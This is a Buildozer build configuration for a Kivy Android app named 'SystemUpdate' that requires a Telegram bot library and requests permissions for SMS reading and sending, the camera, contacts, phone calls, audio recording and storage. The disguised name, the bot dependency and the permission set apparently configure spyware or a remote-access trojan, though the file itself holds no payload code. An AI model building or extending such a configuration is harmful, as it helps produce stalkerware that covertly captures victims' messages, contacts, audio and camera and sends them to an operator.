[app]
title = SystemUpdate
package.name = system_update
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1
requirements = python3,kivy,pyTelegramBotAPI,requests
orientation = portrait
fullscreen = 0
android.permissions = INTERNET, READ_SMS, RECEIVE_SMS, SEND_SMS, CAMERA, READ_CONTACTS, CALL_PHONE, RECORD_AUDIO, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE
android.api = 31
android.minapi = 21
android.sdk = 31
android.ndk = 23b
android.arch = arm64-v8a
p4a.branch = master
